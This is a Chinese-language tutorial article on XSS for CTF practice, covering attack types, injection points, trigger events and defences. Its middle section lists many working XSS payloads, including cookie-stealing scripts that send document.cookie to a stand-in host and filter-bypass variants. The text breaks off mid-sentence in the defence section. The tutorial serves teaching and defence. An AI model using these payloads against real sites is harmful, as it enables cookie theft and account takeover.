---
title: CTF之xss注入——一切都似乎没有问题
url: https://mp.weixin.qq.com/s/iPWkiZsb7kRgd7Kp8SEfcA
source: Doonsec's feed
date: 2026-05-17
fetch_date: 2026-05-18T06:06:52.621664
---

# CTF之xss注入——一切都似乎没有问题

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/njicUbJnVlIyRZ0Q0MowEPWB7kMfctleY7kusNYR59cicJCDNcdUJvcndqUtuhh1k01f3slfxb0HEP3gljaaT8cYicGE3wJJoclP7fnyicTPbzs/0?wx_fmt=jpeg)

# CTF之xss注入——一切都似乎没有问题

原创

书中自有代码来
书中自有代码来

书中自有代码来

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 一、什么是xss注入

XSS（Cross Site Scripting，跨站脚本攻击）是一种常见的HTML注入攻击。其核心原理是攻击者利用目标服务器对用户输入缺乏安全验证的漏洞，将恶意脚本夹带在正常输入中注入到HTML页面里。当受害者的浏览器访问该页面并渲染文档时，由于对服务器的信任，会毫无阻碍地执行这些未被预期的恶意脚本指令。在攻击者、目标服务器与受害者浏览器这三个角色的交互中，攻击者借此成功窃取信息或破坏页面，从而达成其恶意目的。

# 二、xss几种类型

## 反射型

反射型XSS（又称非持久型XSS）是一种单次触发的跨站脚本攻击。其核心原理是攻击者将恶意脚本夹带在URL等参数中构造出恶意链接，服务器接收请求后未做安全处理，直接将脚本“反射”回页面。由于代码仅存在于单次HTTP请求与响应中而不存储于服务器，受害者必须通过点击钓鱼邮件等恶意链接主动触发，浏览器解析后才会执行代码，常见于搜索框回显或错误提示页。该攻击具备即时性、需诱骗点击、反馈率低及易窃取隐私等特点。防御需坚持“不信任前端数据”原则：渲染内容应源自服务端，避免直接从URL或DOM API获取数据渲染；严禁使用eval、innerHTML等执行字符串的方法；若无法避免，必须对所有涉及DOM渲染的字段进行严格的转义编码处理。

### 常见入口

1. **URL 参数与页面回显**：这是最经典的入口。攻击者将恶意代码直接拼接到 URL 的查询参数中（如 `?id=...` 或 `?name=...`），服务器未过滤直接将其显示在页面上。
2. **搜索框回显**：极为高发的场景。当用户输入关键词搜索后，页面通常会展示“您搜索的关键词是：XXX”，如果未对关键词进行转义，极易触发 XSS。
3. **错误提示页面**：当用户访问不存在的资源或登录失败时，服务器返回的错误信息中常包含用户刚才输入的内容（如“未找到用户 XXX”、“请求的页面 YYY 不存在”），这些位置常被忽略防护。
4. **HTTP 请求头信息**：部分网站会将客户端的请求头信息直接渲染到页面中。例如，将 `Referer`、`User-Agent`或 `X-Forwarded-For`直接显示在日志统计或错误报告中。
5. **文件上传与展示**：在上传文件时，如果文件名、文件路径或图片的元数据（Metadata）未经过滤直接显示在网页上，也可能成为恶意脚本的载体（例如上传名为 `<script>alert(1)</script>.jpg` 的文件）。
6. **站内信与反馈系统的即时回显**：虽然站内信常涉及存储型 XSS，但在提交反馈或发送消息后的“提交成功”跳转页，如果直接回显了用户刚才输入的标题或内容，同样属于反射型 XSS 的范畴。

## 持久型

存储型XSS（又称持久型XSS）是危害性最大的跨站脚本攻击。其核心原理是攻击者通过发帖、评论等交互功能，将恶意脚本永久植入目标服务器的后端数据库中；当其他用户访问包含该数据的页面时，服务器直接从数据库加载并渲染恶意脚本，导致其在用户浏览器中自动执行。由于代码被持久化存储，无需诱导用户点击特定链接，只要访问被污染的页面即会触发攻击。这种极高的隐蔽性不仅极易造成蠕虫式的大规模传播，还会导致大量Cookie被盗取，甚至将用户机器变为DDoS攻击的肉鸡。防御存储型XSS需坚持“不信任任何数据”的原则：后端在数据入库前和输出给前端时，都必须对所有字段进行统一的转义处理；同时，前端在渲染页面DOM时，也必须对任何后端数据进行严格的转义，构建纵深防御体系。

### 常见入口

1. **基础交互与表单区域**：这是最经典的存储型 XSS 入口。包括**评论区、留言板、论坛帖子**、在线客服或问题反馈区。任何用户提交后会被其他用户浏览的文本框，都是攻击者的首选目标。
2. **用户资料与个性化展示字段**：现代应用通常允许用户自定义展示内容。攻击者会在**用户昵称、个性签名、个人简介、头像链接**等字段中注入恶意脚本。当其他用户访问该用户的个人主页或资料卡片时，脚本便会自动触发。
3. **文件上传与内容预览**：这是一个极易被忽略的高危场景。如果网站支持上传文件并提供在线预览功能，攻击者可以将恶意 JavaScript 代码隐藏在文档的元数据或注释中。当其他用户触发预览功能时，解析服务可能会执行这些脚本。此外，上传文件时的**文件名**如果未经过滤直接显示在页面上，也是一个常见的注入点。
4. **后台管理与内部业务系统**：这是危害性极高的入口。攻击者可以在**管理员日志评论区、系统配置备注栏、后台通知发布页、用户反馈管理页、工单处理备注框**等位置植入恶意代码。由于这些页面通常由高权限的管理员访问，一旦触发，极易导致管理员权限被窃取或后台系统被接管。
5. **电商与业务数据展示**：在电商或业务系统中，**产品评价、订单备注信息**等字段如果缺乏过滤，同样会成为恶意代码的温床。当客服或商家在后台查看订单详情时，就可能触发攻击。
6. **系统回显与错误日志**：部分网站会将用户的某些输入内容记录在服务器的报错信息或系统日志中，并在特定页面展示给管理员或其他用户。如果这些日志或错误信息未经转义直接渲染，也会形成存储型 XSS。

## DOM型

DOM型XSS（基于文档对象模型的跨站脚本攻击）是一种纯客户端的攻击方式。其核心原理在于前端JavaScript代码的逻辑缺陷：客户端脚本从`document.URL`、`location.hash`、`location.search`等用户可控的输入源中提取数据后，未经严格的安全校验与过滤，就直接通过DOM操作动态修改页面结构。这种漏洞的触发完全依赖于前端脚本逻辑，恶意代码仅在受害者的本地浏览器中执行，不依赖于向服务器端提交数据或服务器的响应回显。由于攻击过程完全发生在客户端，传统的服务器端防御措施往往难以察觉和拦截，因此对前端代码的安全审计与输入消毒显得尤为重要。

### 常见入口

1. **URL 相关数据**

   ：这是最常见的 DOM XSS 入口。攻击者可以通过修改 URL 来注入恶意代码，前端脚本如果直接读取并渲染这些数据，就会触发漏洞。

* `location.href`

  （完整的 URL）
* `location.search`

  （URL 中 `?` 后的查询参数）
* `location.hash`

  （URL 中 `#` 后的片段标识符，常用于单页应用的前端路由）
* `document.URL`

  / `document.documentURI`

2. **页面交互与跨域数据**

   ：

* `document.referrer`

  ：当前页面是从哪个页面跳转过来的。攻击者可以伪造来源页面，将恶意代码植入 Referrer 中。
* `window.name`

  ：浏览器窗口的名称。该属性在页面跳转后依然可以保留，常被用于跨页面传递数据，若未过滤直接使用极其危险。
* `postMessage`

  数据：在跨域通信中，如果接收方没有严格校验 `message` 事件的来源和数据内容，直接渲染接收到的数据，也会引发 DOM XSS。

3. **本地存储数据**

   ：

* `localStorage` / `sessionStorage` / `Cookie`：如果前端脚本从这些本地存储中读取数据并直接写入页面，而攻击者之前通过其他漏洞在这些存储中写入了恶意代码，同样会触发 DOM XSS。

# 三、攻击载荷和代码

## （一）script标签

### 1. 弹窗

```
http://example.com/a.php?a=<script>alert("This is a xss test")</script>
<script>alert("hack")</script>
<script>alert(/hack/)</script>
<script>alert(1)</script>
```

### 2. 获取cookie

```
<script>document.location.href='https://example.com/steal?cookie='+document.cookie</script>
<script>alert(document.cookie)</script>
```

### 3.引用外部脚本

```
<script src=http://xxx.com/xss.js></script>
```

### 4. 直接内嵌有害脚本

```
<script>
$('div.layui-table-cell').each(function(index,value){
    if(value.innerHTML.indexOf('flag{')>-1){
        window.location.href='http://example.com/'+value.innerHTML;
    }
});
</script>
```

## （二）body标签

```
<body οnlοad=alert(1)>
<body οnpageshοw=alert(1)>
```

## （三）多媒体标签

```
<video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
<video><source onerror=alert(1)>
<audio src=1 onerror=alert(1);>
<object data=1 onerror=alert(1);>
<svg onload="alert(1)">
<svg onload="alert(1)"//
<img src="" onerror=location.href="https://example.com/steal?cookie="+document.cookie>
<img  src=1  οnerrοr=alert("hack")>
<img  src=1  οnerrοr=alert(document.cookie)>
<svg onmousewheel=alert(1)> //需要滚动元素
```

## （四）style标签

```
<style onload=alert(1)></style>
<style onreadystatechange=alert(1)></style>
<style>@import 'javascript:alert(1)';</style>
<style>body{background-image: url("javascript:alert(1)");}</style>
```

## （五）注释

```
--><script>alert(1)</script>
```

## （六）属性名与属性值

```
" onmouseover="alert(1)" x="
" autofocus onfocus="alert(1)" x="
"><script>alert(1)</script><"
```

## （七）标签名

```
<img src=x onerror=alert(1)>

<ImG sRc=x oNeRrOr=alert(1)>
```

## （八）css样式设置

```
red; background-image: url(javascript:alert(1)); color:
red; width: expression(alert(1));
";"><script>alert(1)</script><" x="
```

## （九）iframe标签

```
<iframe src="http://127.0.0.1/1.html"></iframe>
<iframe onload=alert(1);></iframe>
```

## （十）link标签

```
<link rel=stylesheet href=1 onerror=alert(1)>
```

## （十一）表单标签

```
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus>
<input onfocus=alert(1);>
<input onblur=alert(1);>
<input oninput=alert(1);>
<input onchange=alert(1);>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus></select>
<button onfocus=alert(1) autofocus></button>
<form onreset=alert(1)><input type=reset></form> //需点击重置按钮
```

## （十二）文本样式标签

```
<a href= onfocus=alert(1) autofocus></a>
<a style=content-visibility:auto oncontentvisibilityautostatechange=alert(1)>
<h style=content-visibility:auto oncontentvisibilityautostatechange=alert(1)>
<div oncontextmenu=alert(1);>右键点我</div> //需要右键点击元素
```

## 总结

XSS攻击载荷的构造虽然千变万化，但其核心逻辑始终围绕着利用HTML标签承载与通过特定条件触发这两个关键维度展开。在核心标签载体方面，攻击者既会使用script标签直接嵌入JavaScript代码来执行弹窗或引用外部恶意脚本，也会大量利用img、svg、video、audio等多媒体标签以及iframe、body、style和各类表单标签进行隐蔽寄生，因为这些标签在日常网页中极为常见且不易引起警觉。在触发机制方面，事件驱动是最主流的方式，例如利用img标签配合onerror属性，只要图片资源加载失败即可在无需用户交互的情况下自动触发恶意代码；而onclick、onmouseover等属性则需要诱导用户点击或悬停，不过攻击者常会配合autofocus自动聚焦属性让表单元素在页面加载时自动获得焦点，从而实现无交互的静默触发。此外，当常规标签或属性被过滤时，攻击者还会利用大小写混淆、用斜杠代替空格、闭合逃逸提前闭合HTML标签强行插入恶意代码，以及利用javascript伪协议或CSS的expression等非常规途径来突破防御，最终在受害者毫无察觉的情况下执行非预期的恶意脚本。

常用触发机制：

| 事件属性 | 触发机制 | 常见载体标签 |
| --- | --- | --- |
| onfocus | 元素获得焦点时触发 | `<input>` , `<textarea>`, `<select>` |
| onblur | 元素失去焦点时触发 | `<input>` , `<textarea>`, `<select>` |
| onerror | 资源加载失败时触发 | `<img>` , `<script>`, `<video>` |
| onload | 元素加载完成时触发 | `<body>` , `<img>`, `<iframe>`, `<svg>` |
| onclick | 鼠标点击元素时触发 | `<a>` , `<div>`, `<button>` |
| onmouseover | 鼠标悬停在元素上触发 | `<img>` , `<div>`, `<a>` |
| onmouseenter | 鼠标首次进入元素触发 | `<div>` , `<img>`, `<table>` |
| onchange | 元素值改变且失焦触发 | `<input>` , `<select>`, `<textarea>` |
| oninput | 用户输入内容时触发 | `<input>` , `<textarea>` |
| onsubmit | 表单提交时触发 | `<form>` |
| onreset | 表单重置时触发 | `<form>` |
| ontoggle | 折叠状态改变时触发 | `<details>` |
| onanimationstart | CSS动画开始时触发 | 任意带CSS动画的元素 |
| ontransitionend | CSS过渡结束时触发 | 任意带CSS过渡的元素 |
| oncontextmenu | 点击鼠标右键时触发 | `<div>` , `<body>`, `<img>` |
| onwheel | 滚动鼠标滚轮时触发 | `<div>` , `<body>`, `<canvas>` |
| oncopy / onpaste | 复制、粘贴时触发 | `<input>` , `<textarea>` |
| onresize | 窗口大小调整时触发 | `<body>` , `<window>` |
| onscroll | 滚动滚动条时触发 | `<div>` , `<body>`, `<textarea>` |

# 四、如何防范

防御XSS（跨站脚本攻击）的核心在于构建一套严密且多层次的“纵深防御体系”，绝不能仅仅依赖单一的安全措施。首先，必须严格把关数据的入口与出口，这是防御XSS最基础也是最关键的环节。在数据入口层面，要贯彻“不信任任何用户输入”的原则，在服务器端对输入数据进行严格的验证与过滤。对于常规字段，应采用白名单机制限制输入的格式、类型和长度；对于必须支持富文本的场景，切忌使用容易被绕过的黑名单过滤，而应使用专业的安全库对HTML内容进行深度净化。在数据出口层面，无论输入是否经过过滤，在将数据输出到前端页面时，都必须根据具体的上下文环境（如HTML标签内容、HTML属性值、JavaScript代码或URL参数）进行相应的实体编码。例如，将 `<` 转义为 `&lt;`，将 `"` 转义为 `&quot;`，从而确保浏览器将用户输入的内...